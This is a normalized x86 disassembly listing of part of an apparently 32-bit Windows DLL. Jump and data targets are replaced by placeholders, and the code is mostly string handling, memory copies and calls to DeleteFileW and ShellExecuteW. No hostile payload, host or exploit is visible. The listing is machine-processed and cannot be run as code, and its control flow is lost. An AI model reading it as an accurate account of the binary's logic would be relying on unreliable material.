mov ecx [ ebp - 0x6b4 ]
push ecx
push eax
lea edx [ ebp - 0x3ac ]
push edx
mov [ ebp - 0x4 ] 0x68
call sub_10013a70
add esp 0x48
mov ecx [ ebp - 0x6ac ]
push ecx
push eax
lea edx [ ebp - 0x240 ]
push edx
mov [ ebp - 0x4 ] 0x69
call sub_10013a70
lea ecx [ ebp - 0x160 ]
push ecx
push eax
lea edx [ ebp - 0x390 ]
push edx
mov [ ebp - 0x4 ] 0x6a
call sub_10007de0
lea ecx [ ebp + 0x8 ]
push ecx
push eax
lea edx [ ebp - 0xd4 ]
push edx
mov [ ebp - 0x4 ] 0x6b
call sub_10007de0
mov ecx [ ebp - 0x6a8 ]
push ecx
push eax
lea edx [ ebp - 0xb8 ]
push edx
mov [ ebp - 0x4 ] 0x6c
call sub_10013a70
push edi
push eax
lea eax [ ebp - 0x9c ]
push eax
mov [ ebp - 0x4 ] 0x6d
call sub_10013a70
lea ecx [ ebp - 0x1ec ]
push ecx
push eax
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x4 ] 0x6e
call sub_10007de0
add esp 0x48
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x6f
call sub_10003860
lea ecx [ ebp - 0x80 ]
call sub_100018c0
lea ecx [ ebp - 0x9c ]
call sub_100018c0
lea ecx [ ebp - 0xb8 ]
call sub_100018c0
lea ecx [ ebp - 0xd4 ]
call sub_100018c0
lea ecx [ ebp - 0x390 ]
call sub_100018c0
lea ecx [ ebp - 0x240 ]
call sub_100018c0
lea ecx [ ebp - 0x3ac ]
call sub_100018c0
lea ecx [ ebp - 0x374 ]
call sub_100018c0
lea ecx [ ebp - 0x33c ]
call sub_100018c0
lea ecx [ ebp - 0x304 ]
call sub_100018c0
lea ecx [ ebp - 0x2cc ]
call sub_100018c0
lea ecx [ ebp - 0x294 ]
call sub_100018c0
lea ecx [ ebp - 0x25c ]
call sub_100018c0
lea ecx [ ebp - 0x224 ]
call sub_100018c0
lea ecx [ ebp - 0x208 ]
call sub_100018c0
lea ecx [ ebp - 0x1d0 ]
call sub_100018c0
lea ecx [ ebp - 0x1b4 ]
call sub_100018c0
lea ecx [ ebp - 0x2b0 ]
call sub_100018c0
lea ecx [ ebp - 0x198 ]
call sub_100018c0
lea ecx [ ebp - 0x320 ]
call sub_100018c0
lea ecx [ ebp - 0x278 ]
call sub_100018c0
lea ecx [ ebp - 0x358 ]
call sub_100018c0
lea ecx [ ebp - 0x400 ]
call sub_100018c0
lea ecx [ ebp - 0x17c ]
call sub_100018c0
lea ecx [ ebp - 0x48 ]
call sub_100018c0
lea ecx [ ebp - 0x64 ]
call sub_100018c0
lea ecx [ ebp - 0x10c ]
call sub_100018c0
lea ecx [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] 0xb
call sub_100018c0
mov ecx [ ebp - 0x698 ]
push 0xffffffff
push ebx
lea eax [ ebp - 0x2c ]
push eax
add ecx 0x8
call sub_10007570
xor eax eax
mov [ ebp - 0x360 ] esi
mov [ ebp - 0x364 ] ebx
mov [ ebp - 0x374 ] ax
cmp [ ebp - 0x328 ] edi
jb r-xdata
mov edx [ ebp - 0x374 ]
push edx
call sub_10019ce4
add esp 0x4
xor edx edx
cmp [ ebp - 0x1f4 ] 0x8
mov [ ebp - 0x1bc ] esi
mov [ ebp - 0x1c0 ] ebx
mov [ ebp - 0x1d0 ] dx
jb r-xdata
mov ecx [ ebp - 0x1d0 ]
push ecx
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0x328 ] esi
mov [ ebp - 0x32c ] ebx
mov [ ebp - 0x33c ] dx
cmp [ ebp - 0x2f0 ] edi
jb r-xdata
mov ecx [ ebp - 0x33c ]
push ecx
call sub_10019ce4
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x210 ] 0x8
mov [ ebp - 0x1f4 ] esi
mov [ ebp - 0x1f8 ] ebx
mov [ ebp - 0x208 ] cx
jb r-xdata
mov eax [ ebp - 0x208 ]
push eax
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp - 0x2f0 ] esi
mov [ ebp - 0x2f4 ] ebx
mov [ ebp - 0x304 ] cx
cmp [ ebp - 0x2b8 ] edi
jb r-xdata
mov eax [ ebp - 0x304 ]
push eax
call sub_10019ce4
add esp 0x4
xor eax eax
cmp [ ebp - 0x248 ] 0x8
mov [ ebp - 0x210 ] esi
mov [ ebp - 0x214 ] ebx
mov [ ebp - 0x224 ] ax
jb r-xdata
mov edx [ ebp - 0x224 ]
push edx
call sub_10019ce4
add esp 0x4
xor eax eax
mov [ ebp - 0x2b8 ] esi
mov [ ebp - 0x2bc ] ebx
mov [ ebp - 0x2cc ] ax
cmp [ ebp - 0x280 ] edi
jb r-xdata
mov edx [ ebp - 0x2cc ]
push edx
call sub_10019ce4
add esp 0x4
xor edx edx
cmp [ ebp - 0x280 ] 0x8
mov [ ebp - 0x248 ] esi
mov [ ebp - 0x24c ] ebx
mov [ ebp - 0x25c ] dx
jb r-xdata
mov ecx [ ebp - 0x25c ]
push ecx
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0x280 ] esi
mov [ ebp - 0x284 ] ebx
mov [ ebp - 0x294 ] dx
cmp [ ebp - 0x248 ] edi
jb r-xdata
mov ecx [ ebp - 0x294 ]
push ecx
call sub_10019ce4
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x2b8 ] 0x8
mov [ ebp - 0x280 ] esi
mov [ ebp - 0x284 ] ebx
mov [ ebp - 0x294 ] cx
jb r-xdata
mov eax [ ebp - 0x294 ]
push eax
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp - 0x248 ] esi
mov [ ebp - 0x24c ] ebx
mov [ ebp - 0x25c ] cx
cmp [ ebp - 0x210 ] edi
jb r-xdata
mov eax [ ebp - 0x25c ]
push eax
call sub_10019ce4
add esp 0x4
xor eax eax
cmp [ ebp - 0x2f0 ] 0x8
mov [ ebp - 0x2b8 ] esi
mov [ ebp - 0x2bc ] ebx
mov [ ebp - 0x2cc ] ax
jb r-xdata
mov edx [ ebp - 0x2cc ]
push edx
call sub_10019ce4
add esp 0x4
xor eax eax
mov [ ebp - 0x210 ] esi
mov [ ebp - 0x214 ] ebx
mov [ ebp - 0x224 ] ax
cmp [ ebp - 0x1f4 ] edi
jb r-xdata
mov edx [ ebp - 0x224 ]
push edx
call sub_10019ce4
add esp 0x4
xor edx edx
cmp [ ebp - 0x328 ] 0x8
mov [ ebp - 0x2f0 ] esi
mov [ ebp - 0x2f4 ] ebx
mov [ ebp - 0x304 ] dx
jb r-xdata
mov ecx [ ebp - 0x304 ]
push ecx
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0x1f4 ] esi
mov [ ebp - 0x1f8 ] ebx
mov [ ebp - 0x208 ] dx
cmp [ ebp - 0x1bc ] edi
jb r-xdata
mov ecx [ ebp - 0x208 ]
push ecx
call sub_10019ce4
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x360 ] 0x8
mov [ ebp - 0x328 ] esi
mov [ ebp - 0x32c ] ebx
mov [ ebp - 0x33c ] cx
jb r-xdata
mov eax [ ebp - 0x33c ]
push eax
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp - 0x1bc ] esi
mov [ ebp - 0x1c0 ] ebx
mov [ ebp - 0x1d0 ] cx
cmp [ ebp - 0x1a0 ] edi
jb r-xdata
mov eax [ ebp - 0x1d0 ]
push eax
call sub_10019ce4
add esp 0x4
xor eax eax
cmp [ ebp - 0x398 ] 0x8
mov [ ebp - 0x360 ] esi
mov [ ebp - 0x364 ] ebx
mov [ ebp - 0x374 ] ax
jb r-xdata
mov edx [ ebp - 0x374 ]
push edx
call sub_10019ce4
add esp 0x4
xor eax eax
mov [ ebp - 0x1a0 ] esi
mov [ ebp - 0x1a4 ] ebx
mov [ ebp - 0x1b4 ] ax
cmp [ ebp - 0x29c ] edi
jb r-xdata
mov edx [ ebp - 0x1b4 ]
push edx
call sub_10019ce4
add esp 0x4
xor edx edx
cmp [ ebp - 0x22c ] 0x8
mov [ ebp - 0x398 ] esi
mov [ ebp - 0x39c ] ebx
mov [ ebp - 0x3ac ] dx
jb r-xdata
mov ecx [ ebp - 0x3ac ]
push ecx
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0x29c ] esi
mov [ ebp - 0x2a0 ] ebx
mov [ ebp - 0x2b0 ] dx
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2b0 ]
push ecx
call sub_10019ce4
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x37c ] 0x8
mov [ ebp - 0x22c ] esi
mov [ ebp - 0x230 ] ebx
mov [ ebp - 0x240 ] cx
jb r-xdata
mov eax [ ebp - 0x240 ]
push eax
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] cx
cmp [ ebp - 0x184 ] edi
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_10019ce4
add esp 0x4
xor eax eax
cmp [ ebp - 0x3d0 ] 0x8
mov [ ebp - 0x37c ] esi
mov [ ebp - 0x380 ] ebx
mov [ ebp - 0x390 ] ax
jb r-xdata
mov edx [ ebp - 0x390 ]
push edx
call sub_10019ce4
add esp 0x4
xor eax eax
mov [ ebp - 0x184 ] esi
mov [ ebp - 0x188 ] ebx
mov [ ebp - 0x198 ] ax
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x198 ]
push edx
call sub_10019ce4
add esp 0x4
xor edx edx
cmp [ ebp - 0xc0 ] 0x8
mov [ ebp - 0x3d0 ] esi
mov [ ebp - 0x3d4 ] ebx
mov [ ebp - 0x3e4 ] dx
jb r-xdata
mov ecx [ ebp - 0x3e4 ]
push ecx
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] dx
cmp [ ebp - 0x30c ] edi
jb r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_10019ce4
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x114 ] 0x8
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] cx
jb r-xdata
mov eax [ ebp - 0xd4 ]
push eax
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp - 0x30c ] esi
mov [ ebp - 0x310 ] ebx
mov [ ebp - 0x320 ] cx
cmp [ ebp - 0xf8 ] edi
jb r-xdata
mov eax [ ebp - 0x320 ]
push eax
call sub_10019ce4
add esp 0x4
xor eax eax
cmp [ ebp - 0xa4 ] 0x8
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] ax
jb r-xdata
mov edx [ ebp - 0x128 ]
push edx
call sub_10019ce4
add esp 0x4
xor eax eax
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] ax
cmp [ ebp - 0x264 ] edi
jb r-xdata
mov edx [ ebp - 0x10c ]
push edx
call sub_10019ce4
add esp 0x4
xor edx edx
cmp [ ebp - 0xdc ] 0x8
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] dx
jb r-xdata
mov ecx [ ebp - 0xb8 ]
push ecx
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0x264 ] esi
mov [ ebp - 0x268 ] ebx
mov [ ebp - 0x278 ] dx
cmp [ ebp - 0xdc ] edi
jb r-xdata
mov ecx [ ebp - 0x278 ]
push ecx
call sub_10019ce4
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x88 ] 0x8
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] cx
jb r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xf0 ] cx
cmp [ ebp - 0x344 ] edi
jb r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_10019ce4
add esp 0x4
xor eax eax
cmp [ ebp - 0xf8 ] 0x8
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] ax
jb r-xdata
mov edx [ ebp - 0x9c ]
push edx
call sub_10019ce4
add esp 0x4
xor eax eax
mov [ ebp - 0x344 ] esi
mov [ ebp - 0x348 ] ebx
mov [ ebp - 0x358 ] ax
cmp [ ebp - 0x114 ] edi
jb r-xdata
mov edx [ ebp - 0x358 ]
push edx
call sub_10019ce4
add esp 0x4
xor edx edx
cmp [ ebp - 0x6c ] 0x8
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x10c ] dx
jb r-xdata
mov ecx [ ebp - 0x10c ]
push ecx
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x128 ] dx
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x168 ] edi
jb r-xdata
mov ecx [ ebp - 0x128 ]
push ecx
call sub_10019ce4
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x50 ] 0x8
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] cx
jb r-xdata
mov eax [ ebp - 0x80 ]
push eax
call sub_10019ce4
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x698 ]
add ecx edi
call sub_10007570
mov eax [ ebp - 0x17c ]
push eax
call sub_10019ce4
add esp 0x4
xor eax eax
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] ax
jb r-xdata
mov edx [ ebp - 0x64 ]
push edx
call sub_10019ce4
add esp 0x4
xor edx edx
cmp [ ebp - 0x168 ] 0x8
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] dx
mov [ ebp - 0x4 ] 0xb
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10019ce4
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x698 ]
add ecx 0x8
call sub_10007570
movzx eax [ ebp + 0x44 ]
dec eax
je r-xdata
mov eax [ ebp - 0x17c ]
push eax
call sub_10019ce4
add esp 0x4
sub esp 0x1c
mov ecx esp
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
mov [ ecx ] ax
lea eax [ ebp - 0x660 ]
mov [ ebp - 0x6a8 ] esp
lea edi [ eax + 0x2 ]
dec eax
je r-xdata
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
lea edx [ ebp - 0x660 ]
push edx
call sub_100034e0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x6ac ] esp
push 0xffffffff
push ebx
lea edx [ ebp + 0x8 ]
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ebp - 0x4 ] 0x2a
mov [ ecx ] ax
call sub_100019e0
mov ecx [ ebp - 0x698 ]
mov [ ebp - 0x4 ] 0xb
call sub_10013b60
jmp r-xdata
push 0x1
xor eax eax
push r--data
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] ax
call sub_100034e0
lea ecx [ ebp - 0x64 ]
push ecx
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0xd4 ]
push eax
mov [ ebp - 0x4 ] 0x2b
call sub_10007d90
lea ecx [ ebp - 0x660 ]
push ecx
push eax
lea edx [ ebp - 0xb8 ]
push edx
mov [ ebp - 0x4 ] 0x2c
call sub_10013b00
add esp 0x18
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x2d
call sub_10003860
mov edi 0x8
cmp [ ebp - 0xa4 ] edi
jb r-xdata
dec eax
jne r-xdata
xor ecx ecx
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] cx
cmp [ ebp - 0xc0 ] edi
jb r-xdata
mov eax [ ebp - 0xb8 ]
push eax
call sub_10019ce4
add esp 0x4
push 0x1
xor edx edx
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] dx
call sub_100034e0
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x9c ]
push edx
mov [ ebp - 0x4 ] 0x2e
call sub_10007d90
lea ecx [ ebp - 0x660 ]
push ecx
push eax
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x4 ] 0x2f
call sub_10013b00
add esp 0x18
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x30
call sub_10003860
mov edi 0x8
cmp [ ebp - 0x6c ] edi
jb r-xdata
xor eax eax
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] ax
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0xd4 ]
push edx
call sub_10019ce4
add esp 0x4
xor ecx ecx
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] cx
cmp [ ebp - 0x88 ] edi
jb r-xdata
mov eax [ ebp - 0x80 ]
push eax
call sub_10019ce4
add esp 0x4
mov eax [ ebp - 0x2c ]
xor edx edx
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] dx
cmp [ ebp - 0x18 ] edi
jae r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_10019ce4
add esp 0x4
xor eax eax
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] ax
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov edx [ ebp - 0x9c ]
push edx
call sub_10019ce4
add esp 0x4
push eax
call [ DeleteFileW@IAT ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
xor edx edx
push 0x18
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] dx
call sub_1001a818
add esp 0x4
mov [ ebp - 0x6a8 ] eax
mov [ ebp - 0x4 ] 0x31
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10019ce4
add esp 0x4
xor edi edi
mov ecx eax
call sub_10012700
mov edi eax
jmp r-xdata
push ebx
push ebx
push ebx
push eax
mov ecx edi
call j_sub_100127b0
push eax
push ebx
call [ ShellExecuteW@IAT ]
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x2c ]
push 0xc
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] 0xb
call sub_10012790
push 0xa
push rw-data
mov ecx edi
call sub_10012770
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx edi
call sub_10012740
push edi
call sub_10019ce4
add esp 0x4
jmp r-xdata
sub_10015f00
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
je r-xdata
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov eax 0xffff
cmp [ esi + 0x4 ] ax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ rw-data ]
push edi
lea eax [ ecx + edx + 0x4 ]
push 0x1
push eax
mov [ ebp + 0x8 ] eax
call sub_1001a8ef
mov edi eax
add esp 0x8
cmp edi ebx
jne r-xdata
push 0x8
call sub_1001a818
add esp 0x4
cmp eax ebx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov eax [ esi ]
mov edx [ rw-data ]
mov [ edi ] eax
mov cx [ esi + 0x4 ]
mov eax [ rw-data ]
mov [ eax + edi ] cx
add edx eax
mov al [ esi + 0x6 ]
mov [ edx + edi ] al
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax [ rw-data ]
push ecx
mov ecx esi
push edx
sub ecx eax
sub ecx 0x4
push ecx
lea edx [ eax + edi + 0x4 ]
push edx
call sub_1001a92f
add esp 0x10
cmp [ ebx ] 0x0
jne r-xdata
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov ebx eax
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
mov [ ebx ] edi
mov [ ebx + 0x4 ] esi
sub_10015fc0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
xor esi esi
push edi
cmp ebx esi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0xc
mov edi [ ebp + 0x10 ]
cmp edi [ rw-data ]
jb r-xdata
push 0x10
call sub_1001a818
add esp 0x4
cmp eax esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
sub edi [ rw-data ]
mov [ esi ] eax
mov dx [ ecx + ebx ]
mov eax [ rw-data ]
mov [ esi + 0x4 ] dx
mov cl [ eax + ebx ]
push 0x1
push edi
mov [ esi + 0x6 ] cl
call sub_1001a8ef
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
mov dl [ rw-data ]
mov ecx 0xffff
mov [ eax ] esi
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] cx
mov [ eax + 0x6 ] 0xff
mov [ eax + 0x7 ] dl
mov esi eax
mov edx [ rw-data ]
add edx [ ebp + 0xc ]
push edi
push edx
push edi
push ebx
call sub_1001a92f
add esp 0x10
cmp [ esi + 0x8 ] 0x0
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] edi
sub_10016080
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov [ ebp - 0x8 ] edi
test esi esi
jne r-xdata
mov eax [ edi ]
mov edx [ eax ]
push esi
call edx
test al al
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
sub eax 0x4
jmp r-xdata
xor edx edx
cmp [ esi + 0x4 ] 0x4
jbe r-xdata
test ecx ecx
je r-xdata
mov edi [ ebp - 0x4 ]
mov edx 0xb
mov eax rw-data
lea ecx [ edi + esi - 0xb ]
push ebx
nop
mov edx [ rw-data ]
add edx ecx
jmp r-xdata
push esi
call sub_1001a3eb
add esp 0x4
pop ebx
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
sub edx 0x4
add eax 0x4
add ecx 0x4
cmp edx 0x4
jae r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx [ rw-data ]
sub eax ecx
add ecx edx
push eax
push ecx
mov ecx [ edi + 0x8 ]
call sub_10013200
mov esi eax
test esi esi
je r-xdata
mov ebx [ ecx ]
cmp ebx [ eax ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov al [ eax + 0x2 ]
cmp al [ ecx + 0x2 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
test eax eax
je r-xdata
or eax 0xffffffff
mov edx [ rw-data ]
mov eax [ eax + edx ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add edi 0xfffffff5
push edi
push esi
push eax
call sub_10015fc0
push esi
mov edi eax
call sub_1001a3eb
add esp 0x4
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10016180
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
xor edx edx
mov edx [ esi + 0x4 ]
sub edx 0x4
jmp r-xdata
mov ecx [ ecx + 0x8 ]
xor eax eax
push edx
push eax
call sub_10013100
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x4 ] 0x4
jbe r-xdata
test eax eax
je r-xdata
add eax [ rw-data ]
mov ecx [ ecx + 0x8 ]
push edx
push eax
call sub_10013100
pop esi
pop ebp
retn 0x4
sub_100161d0
push ebp
mov ebp esp
push esi
push edi
mov esi ecx
mov ecx [ esi + 0x8 ]
push 0xffffffff
push 0x0
call sub_100130b0
mov edx [ ebp + 0xc ]
mov ecx eax
shr ecx 0x10
xor ecx eax
mov eax [ ebp + 0x8 ]
movzx edi cx
mov ecx [ esi + 0x8 ]
push edx
push eax
push edi
call sub_10012e70
movzx eax ax
shl eax 0x10
xor eax edi
pop edi
pop esi
pop ebp
retn 0x8
sub_10016210
push ebp
mov ebp esp
push 0xffffffff
push sub_1002da4b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x8
mov [ esi ] r--data
mov [ esi + 0x4 ] 0x0
call sub_1001a818
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
mov ecx eax
call sub_10012e30
jmp r-xdata
mov [ esi + 0x8 ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_10016290
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
test eax eax
jne r-xdata
push esi
push eax
call sub_10015f00
mov esi eax
cmp [ esi ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn 0x4
push edi
mov [ ebp - 0x4 ] 0x0
mov edi [ esi ]
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
sub eax 0x4
jmp r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
pop ebx
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
test edi edi
je r-xdata
push ebx
add eax 0xb
push 0x1
push eax
mov [ ebp - 0xc ] eax
call sub_1001a8ef
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
xor ecx ecx
mov ecx [ esi + 0x4 ]
sub ecx 0x4
jmp r-xdata
xor edx edx
cmp [ esi + 0x4 ] 0x4
jbe r-xdata
test edi edi
je r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
sub eax 0x4
jmp r-xdata
mov eax [ rw-data ]
lea edx [ edi + eax ]
jmp r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
sub eax 0x4
jmp r-xdata
push ecx
push edx
push eax
push ebx
call sub_1001a92f
add esp 0x10
cmp [ esi ] 0x0
je r-xdata
test edi edi
je r-xdata
push esi
call sub_10019ce4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add esp 0x4
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx [ eax + 0x8 ]
push edx
push ebx
call sub_10013130
push ebx
mov edi eax
call sub_1001a3eb
add esp 0x4
test edi edi
jne r-xdata
push eax
call sub_1001a3eb
add esp 0x4
push 0xb
push rw-data
add eax ebx
push 0xb
push eax
call sub_1001a92f
mov eax [ esi ]
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ ebp - 0x8 ]
push edi
call sub_100161d0
mov ebx [ ebp - 0x4 ]
add ebx 0x8
push 0x1
push ebx
mov [ ebp - 0x10 ] eax
call sub_1001a8ef
mov edx [ ebp + 0x8 ]
push 0x4
mov esi eax
mov eax [ edx ]
lea ecx [ ebp - 0x10 ]
push ecx
lea edx [ esi + 0x4 ]
push 0x4
push edx
mov [ esi ] eax
call sub_1001a92f
mov eax [ ebp - 0x4 ]
push eax
push edi
push eax
lea eax [ esi + 0x8 ]
push eax
call sub_1001a92f
push 0x8
call sub_1001a818
add esp 0x2c
test eax eax
je r-xdata
push edi
xor esi esi
call sub_1001a3eb
add esp 0x4
pop ebx
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ eax ] esi
push edi
mov [ eax + 0x4 ] ebx
mov esi eax
call sub_1001a3eb
add esp 0x4
pop ebx
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10016430
push esi
push 0x1
push 0xc
mov esi ecx
call sub_1001a8ef
mov [ esi + 0x4 ] eax
or ecx 0xffffffff
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
add esp 0x8
mov [ eax + 0x8 ] ecx
mov eax esi
pop esi
retn
sub_10016460
push ebp
mov ebp esp
push 0xffffffff
push sub_1002da7b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
xor eax eax
xor ebx ebx
push 0x18
mov [ ebp - 0x14 ] 0x0
